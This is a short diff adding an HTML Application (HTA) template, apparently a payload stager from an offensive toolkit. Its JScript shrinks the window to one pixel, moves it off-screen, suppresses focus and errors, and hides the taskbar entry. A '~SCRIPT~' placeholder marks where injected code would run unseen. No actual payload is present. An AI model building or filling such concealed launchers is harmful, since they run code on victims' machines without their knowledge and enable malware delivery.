@@ -1,0 +1,23 @@
+<html>
+<head>
+<script language="JScript">
+window.resizeTo(1, 1);
+window.moveTo(-2000, -2000);
+window.blur();
+
+try
+{
+    window.onfocus = function() { window.blur(); }
+    window.onerror = function(sMsg, sUrl, sLine) { return false; }
+}
+catch (e){}
+
+~SCRIPT~
+</script>
+<hta:application caption="no" showInTaskBar="no" windowState="minimize"
+                 navigable="no" scroll="no" />
+                 <!--  -->
+</head>
+<body>
+</body>
+</html>
